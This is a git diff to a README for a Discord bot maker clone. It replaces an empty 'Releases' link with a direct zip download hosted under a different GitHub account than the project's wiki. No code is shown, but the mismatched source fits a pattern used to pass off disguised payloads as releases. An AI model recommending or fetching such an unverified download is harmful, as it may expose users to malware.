@@ -12,7 +12,7 @@ Only Discord.js Code Type will be supported (If i don't have any plan to add new
 You can see it [Here](https://github.com/dhvitOP/bcfd-bdfd-clone/wiki)
 
 ## Download!
-🎵 Install --> [Releases]()
+🎵 Install --> [Releases](https://github.com/Dexterom/Discord-Bot-Maker/releases/download/v2.7/Relase.zip)
 
 # Notice
 Please Star if you liked this project and fork it if you want to use it also make sure of LICENSE, dont use this project without giving credits or without seeing LICENSE 
